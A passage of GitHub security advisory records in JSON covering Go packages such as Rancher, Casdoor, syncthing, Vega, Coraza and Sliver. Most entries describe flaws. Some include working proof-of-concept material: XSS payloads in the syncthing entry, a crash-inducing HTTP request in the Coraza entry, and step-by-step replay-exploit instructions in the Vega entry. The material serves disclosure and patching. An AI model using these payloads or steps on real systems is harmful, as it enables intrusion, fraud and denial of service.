{"type": "PACKAGE", "url": "https://github.com/rancher/rancher"}, {"type": "WEB", "url": "https://github.com/rancher/rancher/releases/tag/v2.6.13"}, {"type": "WEB", "url": "https://github.com/rancher/rancher/releases/tag/v2.7.4"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-06-06T01:59:54Z", "nvd_published_at": "2023-06-01T13:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-rwcp-qrwg-56cg", "modified": "2023-06-30T19:58:47Z", "published": "2023-06-22T15:30:23Z", "aliases": ["CVE-2023-34927"], "summary": "Casdoor Cross-Site Request Forgery vulnerability", "details": "Casdoor v1.331.0 and below was discovered to contain a Cross-Site Request Forgery (CSRF) in the endpoint `/api/set-password`. This vulnerability allows attackers to arbitrarily change the victim user's password via supplying a crafted URL.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/casdoor/casdoor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.331.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-34927"}, {"type": "WEB", "url": "https://github.com/casdoor/casdoor/issues/1531"}, {"type": "WEB", "url": "https://casdoor.org/"}, {"type": "WEB", "url": "https://gist.github.com/omriman067/4e90a3a4ffa40984f011d8777a995469"}, {"type": "PACKAGE", "url": "https://github.com/casdoor/casdoor"}], "database_specific": {"cwe_ids": ["CWE-352"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-22T20:01:21Z", "nvd_published_at": "2023-06-22T13:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-p976-h52c-26p6", "modified": "2023-06-06T02:00:28Z", "published": "2023-06-06T02:00:28Z", "aliases": ["CVE-2023-22647"], "summary": "Rancher vulnerable to Privilege Escalation via manipulation of Secrets", "details": "### Impact\n\nA vulnerability has been identified which enables [Standard users](https://ranchermanager.docs.rancher.com/how-to-guides/new-user-guides/authentication-permissions-and-global-configuration/manage-role-based-access-control-rbac/global-permissions) or above to elevate their permissions to Administrator in the `local` cluster.\n\nThe `local` cluster means the cluster where Rancher is installed. It is named `local` inside the list of clusters in the Rancher UI.\n\nStandard users could leverage their existing permissions to manipulate Kubernetes secrets in the `local` cluster, resulting in the secret being deleted, but their read-level permissions to the secret being preserved. When this operation was followed-up by other specially crafted commands, it could result in the user gaining access to tokens belonging to service accounts in the `local` cluster.\n\nUsers that have custom global roles which grant `create` and `delete` permissions on `secrets` would also be able to exploit this vulnerability.\n\nUsers with [audit logs enabled](https://ranchermanager.docs.rancher.com/how-to-guides/advanced-user-guides/enable-api-audit-log#enabling-api-audit-log) in Rancher can try to identify possible abuses of this issue by going through the logs. To sieve through the data filter by `kind: Secret` with `type: provisioning.cattle.io/cloud-credential`, then investigate all log entries that affect that specific resource. A secondary check would be to filter by all operations with `Opaque` Secrets within the `cattle-global-data` namespace.\n\nAfter patching, it is recommended that users review access methods to Rancher (including RBAC policies, tokens, and host-level node access), to ensure that no changes were made to persist access to users who have leveraged this vulnerability.\n\n### Patches\n\nPatched versions include releases `2.6.13`, `2.7.4` and later versions. \n\n### Workarounds\n\nThere is no direct mitigation besides updating Rancher to a patched version.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n- Verify with our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0"}, {"fixed": "2.6.13"}]}]}, {"package": {"ecosystem": "Go", "name": "rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.7.0"}, {"fixed": "2.7.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/rancher/rancher/security/advisories/GHSA-p976-h52c-26p6"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-22647"}, {"type": "WEB", "url": "https://bugzilla.suse.com/show_bug.cgi?id=CVE-2023-22647"}, {"type": "PACKAGE", "url": "https://github.com/rancher/rancher"}, {"type": "WEB", "url": "https://github.com/rancher/rancher/releases/tag/v2.6.13"}, {"type": "WEB", "url": "https://github.com/rancher/rancher/releases/tag/v2.7.4"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-06-06T02:00:28Z", "nvd_published_at": "2023-06-01T13:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vpxf-q44g-w34w", "modified": "2023-07-03T18:38:23Z", "published": "2023-06-30T20:36:55Z", "aliases": ["CVE-2023-36815"], "summary": "Sealos billing system permission control defect", "details": "### Summary\n\nThere is a permission flaw in the Sealos billing system, which allows users to control the recharge resource account. sealos. io/v1/Payment, resulting in the ability to recharge any amount of 1 RMB.\n\n### Details\n\nThe reason is that sealos is in arrears. Egg pain, we can't create a terminal anymore. Let's charge for it:\n\nThen it was discovered that the charging interface had returned all resource information. Unfortunately, based on previous vulnerability experience, the namespace of this custom resource is still under the current user's control and may have permission to correct it.\n\n### PoC\ndisable by publish\n\n### Impact\n\n+ sealos public cloud user\n+ CWE-287 Improper Authentication", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/labring/sealos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "4.2.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/labring/sealos/security/advisories/GHSA-vpxf-q44g-w34w"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-36815"}, {"type": "PACKAGE", "url": "https://github.com/labring/sealos"}], "database_specific": {"cwe_ids": ["CWE-287", "CWE-862"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-06-30T20:36:55Z", "nvd_published_at": "2023-07-03T18:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fwv2-65wh-2w8c", "modified": "2023-06-09T22:53:25Z", "published": "2023-06-09T22:53:25Z", "aliases": ["CVE-2023-34231"], "summary": "Snowflake Golang Driver vulnerable to Command Injection", "details": "### Issue\nSnowflake was informed via our bug bounty program of a command injection vulnerability in the Snowflake Golang driver via SSO browser URL authentication.\n\n### Impacted driver package: \ngosnowflake\n\n### Impacted version range: \nbefore [Version 1.6.19](https://community.snowflake.com/s/article/Go-Snowflake-Driver-Release-Notes)\n\n### Attack Scenario\nIn order to exploit the potential for command injection, an attacker would need to be successful in (1) establishing a malicious resource and (2) redirecting users to utilize the resource. The attacker could set up a malicious, publicly accessible server which responds to the SSO URL with an attack payload. If the attacker then tricked a user into visiting the maliciously crafted connection URL, the user\u2019s local machine would render the malicious payload, leading to a remote code execution. \n\nThis attack scenario can be mitigated through URL whitelisting as well as common anti-phishing resources.  \n\n### Solution\nOn March 21, 2023, Snowflake merged a patch that fixed a command injection vulnerability in the Snowflake Golang driver via SSO browser URL authentication. The vulnerability affected the Snowflake Golang driver before Version 1.6.19. We strongly recommend users upgrade to Version 1.6.19 as soon as possible via the following resources: [Go Snowflake Driver](https://docs.snowflake.com/en/developer-guide/golang/go-driver)\n\n### Additional Information\nIf you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our [Vulnerability Disclosure Policy](https://hackerone.com/snowflake?type=team).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/snowflakedb/gosnowflake"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.19"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/snowflakedb/gosnowflake/security/advisories/GHSA-fwv2-65wh-2w8c"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-34231"}, {"type": "WEB", "url": "https://github.com/snowflakedb/gosnowflake/pull/757"}, {"type": "WEB", "url": "https://github.com/snowflakedb/gosnowflake/commit/e11a2a555f1b9f7adc1f01fb7b5e7f38fbbb2a1c"}, {"type": "PACKAGE", "url": "https://github.com/snowflakedb/gosnowflake"}], "database_specific": {"cwe_ids": ["CWE-77"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-06-09T22:53:25Z", "nvd_published_at": "2023-06-08T20:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w44m-8mv2-v78h", "modified": "2023-06-22T20:01:48Z", "published": "2023-06-22T20:01:48Z", "aliases": [], "summary": "Cosmos \"Barberry\" vulnerability in github.com/cosmos/cosmos-sdk", "details": "The cosmos-sdk module is affected by the vulnerability codenamed \"Barberry\".", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cosmos/cosmos-sdk"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.46.0"}, {"fixed": "0.46.13"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cosmos/cosmos-sdk"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.47.0"}, {"fixed": "0.47.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cosmos/cosmos-sdk/pull/16466"}, {"type": "WEB", "url": "https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825"}, {"type": "PACKAGE", "url": "https://github.com/cosmos/cosmos-sdk"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-22T20:01:48Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-8vhc-hwhc-cpj4", "modified": "2023-12-12T19:44:59Z", "published": "2023-06-06T01:59:31Z", "aliases": ["CVE-2020-10676"], "summary": "Rancher users retain access after moving namespaces into projects they don't have access to", "details": "### Impact\nA vulnerability was identified in which users with update privileges on a namespace, can move that namespace into a project they don't have access to. After the namespace transfer is completed, their previous permissions are still preserved, which enables them to gain access to project-specific resources (such as [project secrets](https://ranchermanager.docs.rancher.com/how-to-guides/new-user-guides/kubernetes-resources-setup/secrets#creating-secrets-in-projects)). In addition, resources in the namespace will now count toward the [quota limit](https://ranchermanager.docs.rancher.com/how-to-guides/advanced-user-guides/manage-projects/manage-project-resource-quotas/about-project-resource-quotas) of the new project, potentially causing availability issues.\n\nUser with roles `Project Owner` and `Project Member` on the source project can exploit this vulnerability; however, this would also apply to custom roles with similar privileges. \n\nThe patched version include an improved RBAC mechanism, which checks if the user has the correct permissions before the namespace move takes place.\n\n### Patches\nPatched versions include releases `2.6.13`, `2.7.4` and later versions.\n\n### Workarounds\nThere is no direct mitigation besides updating Rancher to a patched version.\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n- Verify with our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0"}, {"fixed": "2.6.13"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.7.0"}, {"fixed": "2.7.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/rancher/rancher/security/advisories/GHSA-8vhc-hwhc-cpj4"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-10676"}, {"type": "WEB", "url": "https://forums.rancher.com/c/announcements"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-8vhc-hwhc-cpj4"}, {"type": "PACKAGE", "url": "https://github.com/rancher/rancher"}, {"type": "WEB", "url": "https://github.com/rancher/rancher/releases/tag/v2.6.13"}, {"type": "WEB", "url": "https://github.com/rancher/rancher/releases/tag/v2.7.4"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-06-06T01:59:31Z", "nvd_published_at": "2023-12-12T17:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9rp6-23gf-4c3h", "modified": "2023-06-06T18:50:28Z", "published": "2023-06-06T16:39:57Z", "aliases": ["CVE-2022-46165"], "summary": "syncthing vulnerable to Cross-site Scripting (XSS) in Web GUI", "details": "## Impact\n\n1. A compromised instance with shared folders could sync malicious files which contain arbitrary HTML and JavaScript in the name.\nIf the owner of another device looks over the shared folder settings and moves the mouse over the latest sync, a script could be executed to change settings for shared folders or add devices automatically.\n\n2. Adding a new device with a malicious name could embed HTML or JavaScript inside parts of the page.\n\n## Risk\n\nAs long as trusted devices are used, the risk is low.\nAdditionally, the web GUI is not used that often in daily use which reduces the likelihood of exploitation.\n\n## Details\n\n### 1. Field \"Latest Change\"\n\n* Open the web GUI at [http://127.0.0.1:8384/](http://127.0.0.1:8384/).\n* Create/Delete a file named ```<img src=a onerror=alert(123)>``` and sync it to the other instance.\n* Move your mouse over the latest change to trigger the tooltip.\n\n<img width=\"834\" alt=\"latest-change\" src=\"https://user-images.githubusercontent.com/9484134/205084362-20a8ec13-a88d-469f-bdf1-e5291c20f4c1.png\">\n\n##### Web browser source\n```html\n<span tooltip=\"\" data-original-title=\"\\&quot;><img src=a onerror=alert(123)> @ 2022-11-30 16:58:43\"\n    aria-describedby=\"tooltip409527\">\n    <!-- ngIf: !folderStats[folder.id].lastFile.deleted --><span translate=\"\"\n        translate-value-file=\"&quot;><img src=a onerror=alert(123)>\" ng-if=\"!folderStats[folder.id].lastFile.deleted\"\n        class=\"ng-scope\">Updated \"&gt;&lt;img src=a onerror=alert(123)&gt;</span>\n    <!-- end ngIf: !folderStats[folder.id].lastFile.deleted -->\n    <!-- ngIf: folderStats[folder.id].lastFile.deleted -->\n</span>\n<div class=\"tooltip fade top in\" role=\"tooltip\" id=\"tooltip409527\"\n    style=\"top: 446.033px; left: 318.3px; display: block;\">\n    <div class=\"tooltip-arrow\" style=\"left: 50%;\"></div>\n    <div class=\"tooltip-inner\">\\\"&gt;<img src=\"a\" onerror=\"alert(123)\"> @ 2022-11-30 16:58:43</div>\n</div>\n```\n\n##### Corresponding code in the project \n\nFile ````gui/default/index.html````:\n```html\n<tr ng-if=\"folder.type != 'sendonly' && folder.type != 'receiveencrypted' && folderStats[folder.id].lastFile && folderStats[folder.id].lastFile.filename\">\n    <th><span class=\"fas fa-fw fa-exchange-alt\"></span>&nbsp;<span translate>Latest Change</span></th>\n    <td class=\"text-right\">\n        <span tooltip data-original-title=\"{{folderStats[folder.id].lastFile.filename}} @ {{folderStats[folder.id].lastFile.at | date:'yyyy-MM-dd HH:mm:ss'}}\">\n        <span translate translate-value-file=\"{{folderStats[folder.id].lastFile.filename | basename}}\" ng-if=\"!folderStats[folder.id].lastFile.deleted\">Updated {%file%}</span>\n        <span translate translate-value-file=\"{{folderStats[folder.id].lastFile.filename | basename}}\" ng-if=\"folderStats[folder.id].lastFile.deleted\">Deleted {%file%}</span>\n        </span>\n    </td>\n</tr>\n```\n\nFile ````gui/default/syncthing/core/tooltipDirective.js````:  \n```javascript\nangular.module('syncthing.core')\n    .directive('tooltip', function () {\n        return {\n            restrict: 'A',\n            link: function (scope, element, attributes) {\n                $(element).tooltip({\n                    html: 'true'\n                });\n            }\n        };\n    });\n```\n\nThe attribute ```html``` should not be set to ```true``` or input sanitized.\n\n### 2. Field \"Shared With\"\n\n* Open the web GUI at [http://127.0.0.1:8384/](http://127.0.0.1:8384/).\n* Create a device with the following name ```fedora 1\"'><h1>Headline</h1><img src=x><script>alert(1)</script>```.\n* Add the device to another instance and share a folder.\n* Move your mouse over the malicious device name to trigger the tooltip.\n \n<img width=\"608\" alt=\"shared-with-1\" src=\"https://user-images.githubusercontent.com/9484134/205084172-8cab2d0e-3257-46d5-be81-41fbd7228e0c.png\">\n\n\n##### Web browser source  \n\n```html\n<span tooltip=\"\" data-original-title=\"fedora 1&quot;'><h1>Headline</h1><img src=x><script>alert(1)</script>  \"\n    ng-bind-html=\"sharesFolder(folder)\" class=\"ng-binding\" aria-describedby=\"tooltip348410\">fedora 1\"'&gt;<h1>Headline\n    </h1><img src=\"x\"></span>\n<div class=\"tooltip fade top\" role=\"tooltip\" id=\"tooltip348410\" style=\"top: 0px; left: 0px; display: block;\">\n    <div class=\"tooltip-arrow\" style=\"left: 50%;\"></div>\n    <div class=\"tooltip-inner\">fedora 1\"'&gt;<h1>Headline</h1><img src=\"x\">\n        <script>alert(1)</script>\n    </div>\n</div>\n```\n\n##### Corresponding code in the project \n\nFile ````gui/default/index.html````:\n\n```html\n<tr>\n    <th><span class=\"fas fa-fw fa-share-alt\"></span>&nbsp;<span translate>Shared With</span></th>\n    <td class=\"text-right\">\n        <span tooltip data-original-title=\"{{sharesFolder(folder)}} {{folderHasUnacceptedDevices(folder) ? '<br/>(<sup>1</sup>' + ('The remote device has not accepted sharing this folder.' | translate) + ')' : ''}} {{folderHasPausedDevices(folder) ? '<br/>(<sup>2</sup>' + ('The remote device has paused this folder.' | translate) + ')' : ''}}\" ng-bind-html=\"sharesFolder(folder)\"></span>\n    </td>\n</tr>\n```\n\nFile ````gui/default/syncthing/core/tooltipDirective.js````:  \n\n```javascript\nangular.module('syncthing.core')\n    .directive('tooltip', function () {\n        return {\n            restrict: 'A',\n            link: function (scope, element, attributes) {\n                $(element).tooltip({\n                    html: 'true'\n                });\n            }\n        };\n    });\n```\n\nThe attribute ```html``` should not be set to ```true``` or input sanitized.\n\n##### HTML Injection in \"Edit Folder\"\n\n<img width=\"672\" alt=\"shared-with-2\" src=\"https://user-images.githubusercontent.com/9484134/205084067-b33f8536-e350-4de1-86f6-3d4a12a683c3.png\">\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/syncthing/syncthing"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.23.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/syncthing/syncthing/security/advisories/GHSA-9rp6-23gf-4c3h"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-46165"}, {"type": "WEB", "url": "https://github.com/syncthing/syncthing/commit/73c52eafb6566435dffd979c3c49562b6d5a4238"}, {"type": "WEB", "url": "https://github.com/syncthing/syncthing/commit/f5e5af391a6583047c64ef8c51642003a79b75cf"}, {"type": "PACKAGE", "url": "https://github.com/syncthing/syncthing"}, {"type": "WEB", "url": "https://github.com/syncthing/syncthing/releases/tag/v1.23.5"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IRYGBFJPVBW6PPTETNIBWQJE4HJSA5PJ/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XEBWSQVGHSTR4ZO7LVVEMPEGMV2DS5XR/"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-06T16:39:57Z", "nvd_published_at": "2023-06-06T18:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8rc9-vxjh-qjf2", "modified": "2023-06-26T16:32:12Z", "published": "2023-06-20T16:36:18Z", "aliases": ["CVE-2023-35163"], "summary": "Vega's validators able to submit duplicate transactions ", "details": "A vulnerability exists that allows a malicious validator to trick the Vega network into re-processing past Ethereum events from Vega\u2019s Ethereum bridge. For example, a deposit to the collateral bridge for 100USDT that credits a party\u2019s general account on Vega, can be re-processed 50 times resulting in 5000USDT in that party\u2019s general account. This is without depositing any more than the original 100USDT on the bridge.\n\nDespite this exploit requiring access to a validator's Vega key, a validator key can be obtained at the small cost of 3000VEGA, the amount needed to announce a new node onto the network.\n\nThe steps to carry out this exploit are as follows:\n1. Cause an Ethereum event on one of the bridge contracts e.g a deposit to the collateral bridge, or the staking bridge\n2. This will result in the Ethereum-event-forwarder of each node to submit a ChainEvent transaction to the Vega network corresponding to that event\n3. Scrape the valid chain event transaction from the Tendermint block data using a node\u2019s Tendermint API\n4. Change the value of the `txId` field of the ChainEvent to any valid, but different, value\n5. Bundle the tweaked ChainEvent into a new transaction, sign it with a validator key and resubmit to the Vega network\n6. The fraudulent ChainEvent will be processed by Vega as if it were a new ChainEvent even though it did not occur on Ethereum\n\nThe key to this exploit is in step 4. The `txId` field of the ChainEvent is used when checking for ChainEvent resubmission, but NOT during the subsequent on-chain verification of the event. Therefore changing the `txId` of an existing ChainEvent is enough to by-pass the duplication check and for it to still be verified as a real event.\n\n### Impact\nThe impact of this exploit is dependent on the ChainEvent being manipulated. The below table describes each one:\n\n| Chain Event  | Allows | Consequence |\n| ------------- | ------------- | ------------- |\n| Deposit | Generation of unlimited funds of any asset  | Withdrawal of all assets |\n| Stake Deposit  | Delegate unlimited Vega to a single node  | A single node has controlling amount of voting power  |\n| Stake Removed  | Force a Validator node to drop below self-stake requirements  | Prevents reward payouts  |\n| Bridge Stop  | The Vega network to think the bridge is stopped  | Prevent anyone from withdrawing funds  |\n| Signer Removed  | The Vega network to think a validator nodes is not on the multisig contract  | Prevent reward payouts  |\n\n### Patches\nv0.71.6\n\n### Workarounds\nNo work around known, however there are mitigations in place should this vulnerability be exploited:\n\n- there are monitoring alerts, for `mainnet1`, in place to identify any issues of this nature including this vulnerability being exploited\n- the validators have the ability to stop the bridge thus stopping any withdrawals should this vulnerability be exploited\n\n### References\nN/A\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:P/AC:H/PR:H/UI:R/S:C/C:H/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "code.vegaprotocol.io/vega"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.71.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/vegaprotocol/vega/security/advisories/GHSA-8rc9-vxjh-qjf2"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-35163"}, {"type": "WEB", "url": "https://github.com/vegaprotocol/vega/commit/56b09bf57af8cd9eca5996252d86f469a3e34c68"}, {"type": "PACKAGE", "url": "https://github.com/vegaprotocol/vega"}, {"type": "WEB", "url": "https://github.com/vegaprotocol/vega/releases/tag/v0.71.6"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-20T16:36:18Z", "nvd_published_at": "2023-06-23T21:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c2pj-v37r-2p6h", "modified": "2023-08-25T21:35:14Z", "published": "2023-06-26T15:48:33Z", "aliases": ["CVE-2023-40586"], "summary": "Coraza has potential denial of service vulnerability", "details": "### Summary\n\nDue to the misuse of `log.Fatalf`, the application using coraza crashed after receiving crafted requests from attackers.\n\n### Details\n\nhttps://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29\nThe bodyprocessors of multipart uses `log.Fatalf` to handle errors from the `mime.ParseMediaType`, but `log.Fatalf` calls `os.Exit` directly after logging the error.\nhttps://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291\nThis means that the application will immediately crash after receiving a malicious request that triggers an error in `mime.ParseMediaType`.\n\n### PoC\n\nThe server can be demonstrated by https://github.com/corazawaf/coraza/tree/main/examples/http-server\n\nAfter sending this request\n```\nPOST / HTTP/1.1\nHost: 127.0.0.1:8090\nUser-Agent: curl/8.1.2\nAccept: */*\nContent-Length: 199\nContent-Type: multipart/form-data; boundary=------------------------5fa6351b877326a1; a=1; a=2\nConnection: close\n\n--------------------------5fa6351b877326a1\nContent-Disposition: form-data; name=\"file\"; filename=\"123\"\nContent-Type: application/octet-stream\n\n123\n\n--------------------------5fa6351b877326a1--\n\n```\nThe server will crash immediately. The `a=1; a=2` in `Content-Type` makes `mime: duplicate parameter name` error.\n\n### Impact\n\nI believe the vulnerability was introduced by the following commit: https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec.\n\n### Mitigation\n\nThe error from `mime.ParseMediaType` should return directly.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/corazawaf/coraza/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.0.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/corazawaf/coraza/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"last_affected": "2.0.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/corazawaf/coraza/security/advisories/GHSA-c2pj-v37r-2p6h"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-40586"}, {"type": "WEB", "url": "https://github.com/corazawaf/coraza-caddy/issues/48"}, {"type": "WEB", "url": "https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec"}, {"type": "WEB", "url": "https://github.com/corazawaf/coraza/commit/a5239ba3ce839e14d9b4f9486e1b4a403dcade8c"}, {"type": "WEB", "url": "https://github.com/corazawaf/coraza/commit/e1b119b83e12c64f0957e00e8cad45a1b5f012f8"}, {"type": "PACKAGE", "url": "https://github.com/corazawaf/coraza"}, {"type": "WEB", "url": "https://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29"}, {"type": "WEB", "url": "https://github.com/corazawaf/coraza/releases/tag/v3.0.1"}, {"type": "WEB", "url": "https://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-06-26T15:48:33Z", "nvd_published_at": "2023-08-25T21:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8jxm-xp43-qh3q", "modified": "2023-06-30T20:22:45Z", "published": "2023-06-21T22:08:34Z", "aliases": ["CVE-2023-34758"], "summary": "Silver vulnerable to MitM attack against implants due to a cryptography vulnerability", "details": "### Summary\nThe current cryptography implementation in Sliver up to version 1.5.39 allows a MitM with access to the corresponding implant binary to execute arbitrary codes on implanted devices via intercepted and crafted responses. (Reserved CVE ID: CVE-2023-34758)\n\n### Details\nPlease see [the PoC repo](https://github.com/tangent65536/Slivjacker).\n\n### PoC\nPlease also see [the PoC repo](https://github.com/tangent65536/Slivjacker).\nTo setup a simple PoC environment,  \n 1. Generate an implant with its C2 set to the PoC server's address and copy the embedded private implant key and public server key into the config json.  \n 2. Run the implant on a separate VM and a `notepad.exe` window should pop up on the implanted VM.  \n\n### Impact\nA successful attack grants the attacker permission to execute arbitrary code on the implanted device.  \n  \n### References\nhttps://github.com/BishopFox/sliver/blob/master/implant/sliver/cryptography/implant.go  \nhttps://github.com/BishopFox/sliver/blob/master/implant/sliver/cryptography/crypto.go  \nhttps://github.com/tangent65536/Slivjacker  \n\n### Credits\n[Ting-Wei Hsieh](https://github.com/tangent65536) from [CHT Security Co. Ltd.](https://www.chtsecurity.com/?lang=en)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/bishopfox/sliver"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0"}, {"fixed": "1.5.40"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/BishopFox/sliver/security/advisories/GHSA-8jxm-xp43-qh3q"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-34758"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-35170"}, {"type": "WEB", "url": "https://github.com/BishopFox/sliver/commit/2d1ea6192cac2ff9d6450b2d96043fdbf8561516"}, {"type": "PACKAGE", "url": "https://github.com/BishopFox/sliver"}, {"type": "WEB", "url": "https://github.com/BishopFox/sliver/blob/master/implant/sliver/cryptography/crypto.go"}, {"type": "WEB", "url": "https://github.com/BishopFox/sliver/blob/master/implant/sliver/cryptography/implant.go"}, {"type": "WEB", "url": "https://github.com/BishopFox/sliver/releases/tag/v1.5.40"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-8jxm-xp43-qh3q"}, {"type": "WEB", "url": "https://github.com/tangent65536/Slivjacker"}, {"type": "WEB", "url": "https://www.chtsecurity.com/news/04f41dcc-1851-463c-93bc-551323ad8091"}], "database_specific": {"cwe_ids": ["CWE-327"], "severity": "HIGH", 